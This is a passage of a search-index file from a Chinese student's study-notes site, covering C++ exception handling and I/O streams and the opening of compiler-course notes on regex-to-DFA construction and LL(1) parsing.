\u5757\u4e2d\u53ef\u4ee5 <code>throw;</code> \u6765\u5c06\u5f53\u524d\u5904\u7406\u7684\u5f02\u5e38\u91cd\u65b0\u629b\u51fa\u53bb\uff0c\u5b9e\u73b0\u5f02\u5e38\u7684\u4f20\u9012</li> </ul> </li> <li>new \u7684\u5f02\u5e38<ul> <li>new \u5728\u5206\u914d\u5931\u8d25\u7684\u65f6\u5019\u4e0d\u4f1a\u50cf malloc \u4e00\u6837\u8fd4\u56de 0</li> <li>\u5206\u914d\u5931\u8d25\u4f1a\u629b\u51fa bad_alloc \u5f02\u5e38</li> </ul> </li> <li>\u6807\u51c6\u5e93\u5f02\u5e38<ul> <li>bad_alloc bad_cast bad_typeid bad_exception</li> <li>runtime_error: overflow_error range_error</li> <li>logic_error: domain_error length_error out_of_range invalid_argument</li> </ul> </li> <li>\u51fd\u6570\u7684\u5f02\u5e38\u58f0\u660e<ul> <li>\u58f0\u660e\u5f53\u524d\u51fd\u6570\u53ef\u80fd\u4f1a\u629b\u51fa\u54ea\u4e9b\u5f02\u5e38     <pre><code>void func(int a) : throw (SomeError, AnotherError) { ... }\n</code></pre><ul> <li><code>throw ()</code> \u4e0d\u629b\u51fa\u4efb\u4f55\u5f02\u5e38\uff0cC++11 \u5199\u4e3a noexcept</li> </ul> </li> <li>\u7f16\u8bd1\u671f\u4e0d\u4f1a\u68c0\u67e5</li> <li>\u8fd0\u884c\u65f6\u629b\u51fa\u4e86\u975e\u9884\u671f\u7684\u5f02\u5e38\u65f6\u4f1a\u629b\u51fa unexpected \u5f02\u5e38<ul> <li>unexpected \u5f02\u5e38\u4f1a\u8c03\u7528 std::unexpected() \u51fd\u6570</li> <li>\u53ef\u4ee5\u901a\u8fc7 std::set_unexpected(handler) \u6765\u5c06\u4e00\u4e2a\u51fd\u6570\u8bbe\u7f6e\u4e3a unexpected \u5904\u7406\u51fd\u6570</li> </ul> </li> </ul> </li> <li>\u6784\u9020\u51fd\u6570\u4e2d\u7684\u5f02\u5e38<ul> <li>\u6784\u9020\u51fd\u6570\u4e2d\u53ef\u4ee5\u629b\u51fa\u5f02\u5e38\uff0c\u4f7f\u5bf9\u8c61\u975e\u5b8c\u5168\u6784\u9020\uff0c\u6790\u6784\u65f6\u4e0d\u4f1a\u8c03\u7528\u6790\u6784\u51fd\u6570\uff0cthrow \u524d\u6e05\u7406\u5206\u914d\u7684\u8d44\u6e90</li> <li>\u53ef\u80fd\u4f1a\u51fa\u73b0\u5185\u5b58\u6cc4\u6f0f\uff0c\u6ce8\u610f delete</li> <li>\u63a8\u8350\u4e8c\u9636\u6bb5\u6784\u9020<ul> <li>\u6784\u9020\u51fd\u6570\u4e2d\u53ea\u8fdb\u884c\u4e00\u4e9b\u7b80\u5355\u7684\u590d\u5236\u548c\u521d\u59cb\u5316\uff08\u4e0d\u5206\u914d\u4efb\u4f55\u8d44\u6e90\uff09</li> <li>\u53ef\u80fd\u4f1a\u629b\u51fa\u5f02\u5e38\u7684\u5de5\u4f5c\u5728\u53e6\u5916\u5355\u72ec\u7684\u51fd\u6570 init \u4e2d\u521d\u59cb\u5316</li> </ul> </li> </ul> </li> <li>\u6790\u6784\u51fd\u6570\u5f02\u5e38<ul> <li>\u6790\u6784\u51fd\u6570\u4e0d\u63a8\u8350\u629b\u51fa\u5f02\u5e38</li> <li>\u5fc5\u987b\u5728\u6790\u6784\u51fd\u6570\u5185\u6d88\u5316\u6240\u6709\u5f02\u5e38\uff0c\u5426\u5219\u4f1a\u8c03\u7528 terminate \u51fd\u6570\u7ec8\u6b62\u7a0b\u5e8f</li> </ul> </li> <li>\u5f02\u5e38\u4e0e\u7ee7\u627f<ul> <li>\u5f02\u5e38\u6d3e\u751f\u7c7b\u80fd\u88ab\u57fa\u7c7b\u6355\u83b7\uff0c\u8981\u5148\u6355\u83b7\u6d3e\u751f\u7c7b\u518d\u6355\u83b7\u57fa\u7c7b     <pre><code>class A { ... };\nclass B: public A { ... };\ntry { ... }\ncatch (B&amp; e) { ... } // \u6ce8\u610f\u4f7f\u7528\u5f15\u7528\ncatch (A&amp; e) { ... }\n</code></pre></li> </ul> </li> <li>\u672a\u6355\u83b7\u7684\u5f02\u5e38<ul> <li>\u672a\u6355\u83b7\u7684\u5f02\u5e38\u4f1a\u8c03\u7528 std::terminate \u51fd\u6570\u7ec8\u6b62\u7a0b\u5e8f</li> <li>\u53ef\u4ee5\u901a\u8fc7 std::set_terminate(handler) \u6765\u5c06\u4e00\u4e2a\u51fd\u6570\u8bbe\u7f6e\u4e3a terminate \u5904\u7406\u51fd\u6570</li> </ul> </li> </ul>"},{"location":"cs/pl/c_cpp/oop/#_21","title":"\u6d41","text":"<ul> <li>\u5206\u7c7b<ul> <li>\u901a\u7528\uff1aistream ostream &lt;iostream&gt;</li> <li>\u6587\u4ef6\uff1aifstream ofstream &lt;fstream&gt;</li> <li>\u5b57\u7b26\u4e32\uff1aistringstream ostringstream &lt;sstream&gt;<ul> <li>C \u5b57\u7b26\u4e32\uff1aistrstream ostrstream &lt;strstream&gt;</li> </ul> </li> </ul> </li> <li>\u8bfb\uff1aextractor &gt;&gt;</li> <li>\u5199\uff1ainserter &lt;&lt;</li> <li>\u6539\u53d8\u6d41\u72b6\u6001\uff1amanipulators</li> <li>\u9884\u5b9a\u4e49\u6d41\uff1acin cout cerr clog</li> <li>\u81ea\u5b9a\u4e49 extractor inserter     <pre><code>istream&amp; operator &gt;&gt; (istream&amp; in, T&amp; obj) {\n    ...\n    return in;\n}\nostream&amp; operator &lt;&lt; (ostream&amp; out, const T&amp; obj) {\n    ...\n    return out;\n}\n</code></pre></li> <li>istream \u5176\u4ed6\u8fd0\u7b97\u7b26<ul> <li><code>while ((ch = cin.get()) != EOF)</code></li> <li><code>istream&amp; get(char&amp; ch)</code></li> <li><code>istream&amp; get(char *buf, int limit, char delim = '\\n')</code></li> <li><code>istream&amp; getline(char *buf, int limit, char delim = '\\n')</code></li> <li><code>istream&amp; ignore(int limit = 1, int delim = EOF)</code></li> <li><code>int gcount()</code> \u8fd4\u56de\u6700\u540e\u4e00\u6b21\u8bfb\u53d6\u7684\u5b57\u7b26\u6570</li> <li><code>istream&amp; putback(char ch)</code> \u5c06\u5b57\u7b26\u653e\u56de\u6d41\u4e2d</li> <li><code>istream&amp; peek()</code> \u8fd4\u56de\u4e0b\u4e00\u4e2a\u5b57\u7b26\u4f46\u4e0d\u4ece\u6d41\u4e2d\u53d6\u51fa</li> </ul> </li> <li>ostream \u5176\u4ed6\u8fd0\u7b97\u7b26<ul> <li><code>ostream&amp; put(char ch)</code></li> <li><code>ostream&amp; write(const char *buf, int size)</code></li> <li><code>ostream&amp; flush()</code> \u5237\u65b0\u7f13\u51b2\u533a</li> </ul> </li> <li>manipulators<ul> <li>dec hex oct\uff0c\u8bbe\u7f6e\u8fdb\u5236\uff0cI/O</li> <li>setw(n) setfill(c)\uff0c\u8bbe\u7f6e\u5bbd\u5ea6\u548c\u586b\u5145\u5b57\u7b26\uff0cI/O</li> <li>endl flush\uff0c\u6362\u884c\u548c\u5237\u65b0\u7f13\u51b2\u533a\uff0cO</li> <li>setbase(n) setprecision(n)\uff0c\u8bbe\u7f6e\u8fdb\u5236\u548c\u7cbe\u5ea6\uff0cO</li> <li>ws\uff0c\u8df3\u8fc7\u7a7a\u767d\u5b57\u7b26\uff0cI</li> <li>setiosflags(...) resetiosflags(...)\uff0c\u8bbe\u7f6e\u548c\u91cd\u7f6e I/O \u683c\u5f0f\u6807\u5fd7\uff0cI/O<ul> <li>ios::left ios::right\uff0c\u5de6\u53f3\u5bf9\u9f50</li> <li>ios::showpos ios::showpoint ios::showbase\uff0c\u663e\u793a\u6b63\u8d1f\u53f7\u3001\u5c0f\u6570\u70b9\u3001\u8fdb\u5236\u524d\u7f00</li> <li>ios::uppercase ios::lowercase\uff0c\u5927\u5199\u5c0f\u5199</li> <li>ios::scientific ios::fixed\uff0c\u79d1\u5b66\u8ba1\u6570\u6cd5\u3001\u5b9a\u70b9\u8868\u793a\u6cd5</li> <li>ios::internal\uff0c\u6570\u503c\u5728\u586b\u5145\u5b57\u7b26\u4e4b\u95f4</li> <li>ios::skipws\uff0c\u8df3\u8fc7\u7a7a\u767d\u5b57\u7b26</li> <li>ios::unitbuf\uff0c\u6bcf\u6b21\u8f93\u51fa\u540e\u5237\u65b0\u7f13\u51b2\u533a</li> <li>\u7528\u4e8c\u8fdb\u5236\u6216\u53e0\u52a0 flag</li> <li>\u4e5f\u53ef\u4ee5\u8c03\u7528\u6210\u5458\u51fd\u6570 setf \u548c unsetf \u6765\u8bbe\u7f6e</li> </ul> </li> </ul> </li> <li>\u6d41\u72b6\u6001<ul> <li>\u6587\u4ef6\u5c3e eof\uff0c\u683c\u5f0f\u9519\u8bef fail\uff0c\u6570\u636e\u4e22\u5931 bad\uff0c\u5176\u4f59 good</li> <li>clear() \u6e05\u9664\u6d41\u72b6\u6001\u5230 good</li> <li>good() eof() fail() bad()\uff0c\u5224\u65ad\u6d41\u72b6\u6001</li> </ul> </li> <li>\u6587\u4ef6\u6d41<ul> <li>\u6253\u5f00\u6a21\u5f0f flag<ul> <li>ios::app \u9644\u52a0\uff0cios::ate \u5b9a\u4f4d\u5230\u6587\u4ef6\u5c3e\uff0cios::trunc \u6e05\u7a7a\u6587\u4ef6</li> <li>ios::in \u8bfb\uff0cios::out \u5199\uff0cios::binary \u4e8c\u8fdb\u5236</li> <li>ios::nocreate \u4e0d\u5b58\u5728\u65f6\u4e0d\u521b\u5efa\uff0cios::noreplace \u5b58\u5728\u65f6\u4e0d\u8986\u76d6</li> </ul> </li> <li>\u7528\u6cd5     <pre><code>ofstream fout(\"file.txt\", ios::out | ios::app);\nfout &lt;&lt; \"Hello\" &lt;&lt; endl;\nfout.close();\nifstream fin(\"file.txt\");\nifstream input;\ninput.open(\"file.txt\", ios::in);\n</code></pre></li> </ul> </li> <li>stream buffer<ul> <li>rdbuf() \u8fd4\u56de\u6d41\u7684 streambuf \u5bf9\u8c61</li> </ul> </li> </ul>"},{"location":"cs/pl/compiler/","title":"\u7f16\u8bd1\u539f\u7406","text":"<p>Abstract</p> <p>\u6d59\u6c5f\u5927\u5b66 \u201c\u7f16\u8bd1\u539f\u7406\u201d \u8bfe\u7a0b\u76f8\u5173\u77e5\u8bc6\u7b14\u8bb0</p> <p>\u53c2\u8003\uff1a</p> <ul> <li>2024 \u6625\u590f\u7f16\u8bd1\u539f\u7406\u59da\u57f9\u68ee\u73ed\u8bfe\u7a0b\u7f51\u7ad9</li> <li>\u56fe\u7075\u73ed\u8bfe\u7a0b\u5b66\u4e60\u6307\u5357\uff1a\u7f16\u8bd1\u539f\u7406</li> </ul>"},{"location":"cs/pl/compiler/#table-of-contents","title":"Table of Contents","text":"<ul> <li>\u8bcd\u6cd5\u5206\u6790\u4e0e\u8bed\u6cd5\u5206\u6790</li> </ul> <p>\u540e\u9762\u61d2\u5f97\u8bb0\u4e86\uff0c\u7b14\u8bb0\u53ef\u53c2\u8003\u7f16\u8bd1\u539f\u7406\u8bfe\u7a0b\u7b14\u8bb0\uff08All-in-One\u901f\u901a\u7248\uff09- CubicY</p>"},{"location":"cs/pl/compiler/topic1/","title":"\u8bcd\u6cd5\u5206\u6790\u4e0e\u8bed\u6cd5\u5206\u6790","text":"<p> \u7ea6 4516 \u4e2a\u5b57  20 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 15 \u5206\u949f</p> <p>Abstract</p> <p>\u7f16\u8bd1\u539f\u7406\u7b2c\u4e00\u81f3\u7b2c\u516d\u5468\u8bfe\u7a0b\u5185\u5bb9</p>"},{"location":"cs/pl/compiler/topic1/#_2","title":"\u8bcd\u6cd5\u5206\u6790","text":"<p>\u5f88\u591a\u4e1c\u897f\u548c\u8ba1\u7b97\u7406\u8bba\u7684\u5185\u5bb9\u91cd\u590d\u4e86\uff0c\u89c1\u8ba1\u7b97\u7406\u8bba\uff1a\u8bed\u8a00\u3001\u81ea\u52a8\u673a\u4e0e\u6b63\u5219\u8868\u8fbe\u5f0f\u3002</p>"},{"location":"cs/pl/compiler/topic1/#_3","title":"\u8bcd\u6cd5\u5206\u6790\u5668\u81ea\u52a8\u751f\u6210","text":"<p>\u76ee\u6807\u662f\u4ece\u6b63\u5219\u8868\u8fbe\u5f0f\u751f\u6210\u6700\u5c0f\u72b6\u6001 DFA\uff0c\u5206\u4e3a\u4ee5\u4e0b\u4e09\u6b65\uff1a</p> <ul> <li>\u6b63\u5219\u8868\u8fbe\u5f0f -&gt; NFA</li> <li>NFA -&gt; DFA</li> <li>DFA -&gt; \u6700\u5c0f DFA</li> </ul>"},{"location":"cs/pl/compiler/topic1/#re-nfa","title":"RE -&gt; NFA","text":"<p>Thompson \u7b97\u6cd5\uff1a\u57fa\u4e8e\u5bf9 RE \u7684\u7ed3\u6784\u8fdb\u884c\u5f52\u7eb3\uff1a</p> <ul> <li>\u5bf9\u4e8e \\(\\varepsilon\\) \u548c\u5355\u4e2a\u5b57\u7b26\u76f4\u63a5\u6784\u9020</li> <li>\u5bf9\u590d\u5408\u7684 RE \u9012\u5f52\u6784\u9020\uff1a<ul> <li>st \u8fde\u63a5\uff1a\u5c06 s \u63a5\u53d7\u72b6\u6001\u548c t \u5f00\u59cb\u72b6\u6001\u8fde\u63a5</li> <li>s | t \u9009\u62e9\uff1a\u65b0\u5efa\u5f00\u59cb\u548c\u63a5\u53d7\u72b6\u6001\uff0c\\(\\varepsilon\\) \u8fde\u63a5\u5230 s \u548c t \u7684\u5f00\u59cb\u548c\u63a5\u53d7\u72b6\u6001</li> <li>s* \u95ed\u5305\uff1a\u65b0\u5efa\u5f00\u59cb\u548c\u63a5\u53d7\u72b6\u6001\uff0c\\(\\varepsilon\\) \u8fde\u63a5\u5f00\u59cb\u5230\u63a5\u53d7\u3001s \u7684\u63a5\u53d7\u72b6\u6001\u5230 s \u7684\u5f00\u59cb\u72b6\u6001</li> </ul> </li> </ul> <p>\u7279\u70b9\uff1a\u751f\u6210\u7684 NFA \u4ec5\u4e00\u4e2a\u63a5\u53d7\u72b6\u6001\uff0c\u4e14\u6ca1\u6709\u51fa\u8fb9\u3002</p>"},{"location":"cs/pl/compiler/topic1/#nfa-dfa","title":"NFA -&gt; DFA","text":"<p>\u540c\u8ba1\u7b97\u7406\u8bba\u4e2d\u8bb2\u5230\u7684\u65b9\u6cd5\uff0c\u5373\u5b50\u96c6\u6784\u9020\u6cd5\uff1a</p> <ul> <li>NFA \u7684\u521d\u59cb\u72b6\u6001\u7684 \\(\\varepsilon\\) \u95ed\u5305\u5bf9\u5e94\u4e8e DFA \u7684\u521d\u59cb\u72b6\u6001</li> <li>\u9488\u5bf9\u6bcf\u4e2a DFA \u72b6\u6001\uff08\u5bf9\u5e94 NFA \u72b6\u6001\u5b50\u96c6 \\(A\\)\uff09<ul> <li>\u6c42\u8f93\u5165\u6bcf\u4e2a \\(a_i\\) \u540e\u80fd\u5230\u8fbe\u7684 NFA \u72b6\u6001\u7684 \\(\\varepsilon\\) \u95ed\u5305\u5e76\u96c6</li> <li>\\(S = \\varepsilon\\mathrm{-closure}(\\mathrm{move}(A, a_i))\\)</li> <li>\\(S\\) \u8981\u4e48\u662f\u5df2\u6709\u7b26\u53f7\uff0c\u8981\u4e48\u662f\u65b0\u7684\u72b6\u6001</li> <li>\u91cd\u590d\u6b64\u8fc7\u7a0b\u81f3\u6ca1\u6709\u65b0\u72b6\u6001\u4ea7\u751f</li> </ul> </li> <li>\u5305\u542b NFA \u7ed3\u675f\u72b6\u6001\u7684\u6240\u6709 DFA \u72b6\u6001\u90fd\u662f\u7ed3\u675f\u72b6\u6001</li> </ul>"},{"location":"cs/pl/compiler/topic1/#dfa-dfa","title":"DFA -&gt; \u6700\u5c0f DFA","text":"<p>\u8ba1\u7b97\u7406\u8bba\u4e2d\u6ca1\u6709\u8bb2\u7684\u90e8\u5206\u3002\u4e00\u4e2a\u6b63\u5219\u8bed\u8a00\u53ef\u80fd\u6709\u591a\u4e2a DFA \u8bc6\u522b\u4ed6\uff0c\u4f46\u901a\u8fc7\u6700\u5c0f\u5316\u5f97\u5230\u7684\u72b6\u6001\u6570\u91cf\u6700\u5c11\u7684 DFA \u662f\u552f\u4e00\u7684\u3002</p> <p>\u901a\u8fc7\u53ef\u533a\u5206\u72b6\u6001\uff08distinguishable states\uff09\u6765\u8fdb\u884c\u6700\u5c0f\u5316\uff1a</p> <ul> <li>\u5982\u679c\u5b58\u5728\u4e32 \\(x\\)\uff0c\u4f7f\u5f97\u4ece \\(s, t\\) \u51fa\u53d1\uff0c\u4e00\u4e2a\u5230\u8fbe\u63a5\u53d7\u72b6\u6001\u4e00\u4e2a\u5230\u8fbe\u975e\u63a5\u53d7\u72b6\u6001\uff0c\u5219 \\(s, t\\) \u53ef\u533a\u5206<ul> <li>\\(\\varepsilon\\) \u533a\u5206\u4efb\u4f55\u63a5\u53d7\u72b6\u6001\u548c\u975e\u63a5\u53d7\u72b6\u6001</li> </ul> </li> <li>\u5982\u679c \\(s, t\\) \u4e0d\u53ef\u533a\u5206\uff0c\u5219\u53ef\u4ee5\u76f4\u63a5\u5408\u5e76</li> </ul> <p>DFA \u6700\u5c0f\u5316\u7b97\u6cd5\uff1a</p> <ul> <li>\u5212\u5206\u90e8\u5206\uff1a<ul> <li>\u521d\u59cb\u5316\u5206\u4e3a\u7ec4 \\(\\Pi = \\{S-F, F\\}\\)\uff08\u63a5\u53d7\u72b6\u6001\u548c\u975e\u63a5\u53d7\u72b6\u6001\uff09</li> <li>\u5bf9\u4e8e \\(\\Pi\\) \u4e2d\u7684\u6bcf\u4e2a\u7ec4\u8fdb\u884c\u8fed\u4ee3\u5212\u5206\uff1a<ul> <li>\u4f7f\u5f97\u4e00\u4e2a\u7ec4\u4e2d\u7684\u72b6\u6001\u5728\u4efb\u610f\u8f93\u5165\u4e0b\u90fd\u5230\u8fbe \\(\\Pi\\) \u4e2d\u7684\u540c\u4e00\u7ec4</li> <li>\u5982\u679c\u5230\u8fbe\u4e86\u4e0d\u540c\u7684\u7ec4\uff0c\u5219\u5212\u5206</li> <li>\u4e0d\u65ad\u91cd\u590d\u8fc7\u7a0b\u76f4\u5230\u4e0d\u53ef\u7ee7\u7eed\u5212\u5206</li> </ul> </li> </ul> </li> <li>\u6784\u9020\u90e8\u5206\uff1a<ul> <li>\u4e00\u4e2a\u7ec4\u4e2d\u9009\u4e00\u4e2a\u4ee3\u8868\u72b6\u6001\uff0c\u5176\u4ed6\u72b6\u6001\u5747\u53ef\u5220\u6389</li> <li>\u5305\u542b\u539f\u5f00\u59cb\u72b6\u6001\u7684\u7ec4\u7684\u4ee3\u8868\u4e3a\u5f00\u59cb\u72b6\u6001\uff0c\u63a5\u53d7\u72b6\u6001\u540c\u7406\uff08\u4f46\u8fd9\u4e2a\u7ec4\u4e00\u5b9a\u53ea\u6709\u63a5\u53d7\u72b6\u6001\uff09</li> </ul> </li> </ul>"},{"location":"cs/pl/compiler/topic1/#_4","title":"\u8bed\u6cd5\u5206\u6790","text":"<ul> <li>\u57fa\u4e8e CFG \u8bed\u6cd5\u8fdb\u884c\u5206\u6790<ul> <li>\u6700\u5de6\u63a8\u5bfc\uff1a\u6bcf\u6b21\u66ff\u6362\u6700\u5de6\u8fb9\u7684\u975e\u7ec8\u7ed3\u7b26<ul> <li>\u6700\u53f3\u89c4\u7ea6\u5c31\u662f\u6700\u5de6\u63a8\u5bfc\u7684\u9006\u8fc7\u7a0b</li> </ul> </li> <li>\u6700\u53f3\u63a8\u5bfc\uff1a\u6bcf\u6b21\u66ff\u6362\u6700\u53f3\u8fb9\u7684\u975e\u7ec8\u7ed3\u7b26</li> </ul> </li> <li>\u5206\u6790\u65b9\u6cd5\uff1a<ul> <li>\u81ea\u9876\u5411\u4e0b\uff08top-down\uff09\uff1a\u4ece\u5f00\u59cb\u7b26\u53f7\u5f00\u59cb\u5c1d\u8bd5\u63a8\u5bfc\uff08derive\uff09\u51fa\u8f93\u5165<ul> <li>\u6bcf\u4e00\u6b65\u63a8\u5bfc\u4e2d\u603b\u662f\u9009\u62e9\u6700\u5de6\u975e\u7ec8\u7ed3\u7b26\u8fdb\u884c\u66ff\u6362</li> <li>\u6bcf\u4e00\u6b65\u63a8\u5bfc\u4e2d\u9700\u8981\u9009\u62e9\u7528\u54ea\u4e2a\u4ea7\u751f\u5f0f\u8fdb\u884c\u66ff\u6362</li> </ul> </li> <li>\u81ea\u5e95\u5411\u4e0a\uff08bottom-up\uff09\uff1a\u5c1d\u8bd5\u6839\u636e\u4ea7\u751f\u5f0f\u89c4\u5219\u89c4\u7ea6\uff08reduce\uff09\u5230\u5f00\u59cb\u7b26\u53f7</li> </ul> </li> </ul>"},{"location":"cs/pl/compiler/topic1/#_5","title":"\u81ea\u9876\u5411\u4e0b\u5206\u6790","text":""},{"location":"cs/pl/compiler/topic1/#_6","title":"\u9012\u5f52\u4e0b\u964d\u5206\u6790","text":"<ul> <li>\u9012\u5f52\u4e0b\u964d\u5206\u6790\uff08Recursive-Descent Parsing\uff09<ul> <li>\u5373\u4ece S \u5f00\u59cb\uff0c\u6839\u636e\u4ea7\u751f\u5f0f\u9012\u5f52\u63a8\u5bfc\uff0c\u76f4\u5230\u63a8\u5bfc\u51fa\u8f93\u5165\u4e32</li> <li>\u53ef\u80fd\u6709\u975e\u5e38\u590d\u6742\u7684\u56de\u6eaf\uff0c\u4ee3\u4ef7\u592a\u9ad8</li> <li>\u5206\u6790\u8fc7\u7a0b\u7c7b\u4f3c NFA</li> </ul> </li> </ul>"},{"location":"cs/pl/compiler/topic1/#ll1","title":"LL(1) \u6587\u6cd5\u4e0e\u9884\u6d4b\u5206\u6790","text":"<ul> <li>\u9884\u6d4b\u5206\u6790\u6cd5\uff08Predictive Parsing\uff09<ul> <li>\u6b64\u65b9\u6cd5\u63a5\u53d7 LL(k) \u6587\u6cd5<ul> <li>L\uff08Left-to-right\uff09\uff1a\u4ece\u5de6\u5230\u53f3\u626b\u63cf</li> <li>L\uff08Leftmost derivation\uff09\uff1a\u6700\u5de6\u63a8\u5bfc</li> <li>k\uff1a\u5411\u524d\u770b k \u54e5 Token \u6765\u786e\u5b9a\u4ea7\u751f\u5f0f\uff08\u4e00\u822c k=1\uff09</li> </ul> </li> </ul> </li> <li>LL(1)\uff1a\u6bcf\u6b21\u4e3a\u6700\u5de6\u8fb9\u7684\u975e\u7ec8\u7ed3\u7b26\u9009\u62e9\u4ea7\u751f\u5f0f\u65f6\uff0c\u5411\u524d\u770b 1 \u4e2a\u8f93\u5165\u7b26\u53f7\u6765\u9884\u6d4b\u8981\u4f7f\u7528\u7684\u4ea7\u751f\u5f0f<ul> <li>\u6784\u9020 First \u96c6\u548c Follow \u96c6<ul> <li>\\(\\mathsf{First}(\\alpha) = \\{a\\mid\\alpha\\Rightarrow^*a\\cdots, a\\in T\\}\\)\uff1a\u53ef\u4ee5\u4ece \\(\\alpha\\) \u63a8\u5bfc\u51fa\u7684\u4e32\u7684\u9996\u4e2a\u7ec8\u7ed3\u7b26\u7684\u96c6\u5408</li> <li>\\(\\mathsf{Follow}(A) = \\{a\\mid S\\Rightarrow^*\\cdots Aa\\cdots, a\\in T\\}\\)\uff1a\u53ef\u4ee5\u8ddf\u5728 \\(A\\) \u540e\u9762\u7684\u7ec8\u7ed3\u7b26\u7684\u96c6\u5408</li> </ul> </li> <li>LL(1) \u6587\u6cd5\u7684\u8981\u6c42\uff1a\u5bf9\u4e8e\u4efb\u4f55\u4e24\u4e2a\u4ea7\u751f\u5f0f \\(A\\to\\alpha\\ |\\ \\beta\\) \u90fd\u6ee1\u8db3\uff1a<ul> <li>\\(\\mathsf{First}(\\alpha)\\cap\\mathsf{First}(\\beta) = \\varnothing\\)\uff1a\\(\\alpha\\) \u548c \\(\\beta\\) \u63a8\u5bfc\u4e0d\u51fa\u4ee5\u540c\u4e00\u4e2a\u7ec8\u7ed3\u7b26\u5f00\u5934\u7684\u4e32</li> <li>\u5982\u679c \\(\\beta\\Rightarrow^*\\varepsilon\\)\uff0c\u5219 \\(\\alpha\\not\\Rightarrow^*\\varepsilon\\) \u4e14 \\(\\mathsf{First}(\\alpha)\\cap\\mathsf{Follow}(A) = \\varnothing\\)\uff1a\u4e00\u4e2a\u63a8\u5bfc\u51fa\u7a7a\u4e32\u65f6\u53e6\u4e00\u4e2a\u4e0d\u80fd\u4ea7\u751f\u548c\u63a8\u5bfc\u51fa\u7a7a\u4e32\u540c\u6837\u7684\u6548\u679c</li> <li>\u6709\u4e86\u8fd9\u4e24\u4e2a\u6761\u4ef6\u53ef\u4ee5\u4fdd\u8bc1\u4ea7\u751f\u5f0f\u9009\u62e9\u7684\u552f\u4e00\u6027</li> </ul> </li> </ul> </li> <li> <p>\u5b9e\u73b0 LL(1) \u9884\u6d4b\u5206\u6790</p> <ul> <li>\u8ba1\u7b97\u51fa First\u3001Follow \u96c6<ul> <li>Nullable\uff1a\u4e00\u4e2a\u975e\u7ec8\u7ed3\u7b26\u662f\u5426\u80fd\u63a8\u5bfc\u51fa\u7a7a\u4e32\uff0c\u6839\u636e\u4ea7\u751f\u5f0f\u76f4\u63a5\u5f52\u7eb3\u5224\u65ad\u5373\u53ef</li> <li>First\uff1a\u91c7\u7528\u5f52\u7eb3\u5b9a\u4e49\u8fdb\u884c\u8ba1\u7b97 \\(\\mathsf{First}(X)\\)<ul> <li>\u5982\u679c \\(X\\) \u662f\u7ec8\u7ed3\u7b26\uff0c\u5219 \\(\\mathsf{First}(X) = \\{X\\}\\)</li> <li>\u5bf9\u4e8e\u4ea7\u751f\u5f0f \\(X\\to Y_1Y_2\\cdots Y_n\\)\uff1a<ul> <li>\u5e76\u4e0a \\(\\mathsf{First}(Y_1)\\)\uff1a\\(X\\) \u53ef\u4ee5\u63a8\u5bfc\u51fa\u7684\u4e32\u7684\u9996\u5b57\u7b26\u4e00\u5b9a\u5305\u542b \\(Y_1\\) \u53ef\u4ee5\u63a8\u5bfc\u51fa\u7684\u4e32\u7684\u9996\u5b57\u7b26</li> <li>\u5982\u679c \\(Y_1\\) \u662f Nullable\uff0c\u5219\u5e76\u4e0a \\(\\mathsf{First}(Y_2)\\)\uff1a\\(Y_1\\) \u662f\u7a7a\u7684\u65f6\u5019\u9996\u5b57\u7b26\u5c31\u8981\u770b \\(Y_2\\)</li> <li>\u5982\u679c \\(Y_1\\) \u548c \\(Y_2\\) \u90fd\u662f Nullable\uff0c\u5219\u5e76\u4e0a \\(\\mathsf{First}(Y_3)\\)\uff0c\u4ee5\u6b64\u7c7b\u63a8</li> </ul> </li> </ul> </li> <li>Follow\uff1a\u91c7\u7528\u5f52\u7eb3\u5b9a\u4e49\u8fdb\u884c\u8ba1\u7b97 \\(\\mathsf{Follow}(A)\\)<ul> <li>\\(\\mathsf{Follow}(A) = \\{\\}\\)</li> <li>\u5bf9\u4e8e\u4ea7\u751f\u5f0f \\(B\\to\\alpha A\\beta\\)\uff1a<ul> <li>\u5e76\u4e0a \\(\\mathsf{First}(\\beta)\\)\uff1a\\(A\\) \u540e\u9762\u53ef\u4ee5\u8ddf\u7684\u4e32\u7684\u9996\u5b57\u7b26\u4e00\u5b9a\u5305\u542b \\(\\beta\\) \u53ef\u4ee5\u63a8\u5bfc\u51fa\u7684\u4e32\u7684\u9996\u5b57\u7b26</li> <li>\u5982\u679c \\(\\beta\\) \u662f Nullable\uff0c\u5219\u5e76\u4e0a \\(\\mathsf{Follow}(B)\\)\uff1a\u540e\u9762\u5168\u662f\u7a7a\u7684\u65f6\u5019\u5c31\u8981\u770b \\(B\\) \u7684 Follow</li> </ul> </li> </ul> </li> </ul> </li> <li>\u6784\u9020\u9884\u6d4b\u5206\u6790\u8868<ul> <li>\u6bcf\u4e00\u884c\u8868\u793a\u4e00\u4e2a\u975e\u7ec8\u7ed3\u7b26 A\uff0c\u6bcf\u4e00\u5217 a \u8868\u793a\u4e00\u4e2a\u7ec8\u7ed3\u7b26\u6216\u8005\u8f93\u5165\u7ed3\u675f\u7b26 $</li> <li>\u8868\u9879\u7b2c A \u884c\u7b2c a \u5217\u8868\u793a\u5bf9\u4e8e\u975e\u7ec8\u7ed3\u7b26 A\uff0c\u4e0b\u4e00\u4e2a\u8f93\u5165 Token \u4e3a a \u65f6\u53ef\u4ee5\u9009\u62e9\u7684\u4ea7\u751f\u5f0f</li> <li>\u5bf9\u4e8e\u6bcf\u4e2a\u4ea7\u751f\u5f0f \\(X\\to\\gamma\\)\uff0c\u8003\u8651\u586b\u5165\u7b2c \\(X\\) \u884c\u7b2c \\(t\\) \u5217\uff1a<ul> <li>\u5982\u679c \\(t\\in\\mathsf{First}(\\gamma)\\)\uff0c\u5219\u586b\u5165\u8fd9\u4e2a\u4ea7\u751f\u5f0f</li> <li>\u5982\u679c \\(\\gamma\\) \u662f Nullable\uff0c\u4e14 \\(t\\in\\mathsf{Follow}(X)\\)\uff0c\u5219\u586b\u5165\u8fd9\u4e2a\u4ea7\u751f\u5f0f</li> </ul> </li> </ul> </li> <li> <p>\u8fdb\u884c\u9884\u6d4b\u5206\u6790</p> <ul> <li>\u53ea\u6709\u6240\u6709\u8868\u9879\u4e2d\u4ea7\u751f\u5f0f\u90fd\u4e0d\u8d85\u8fc7\u4e00\u4e2a\u65f6\u624d\u662f LL(1) \u6587\u6cd5\uff0c\u53ef\u4ee5\u76f4\u63a5\u6839\u636e\u8f93\u5165\u9009\u62e9\u4ea7\u751f\u5f0f\u8fdb\u884c\u63a8\u5bfc</li> 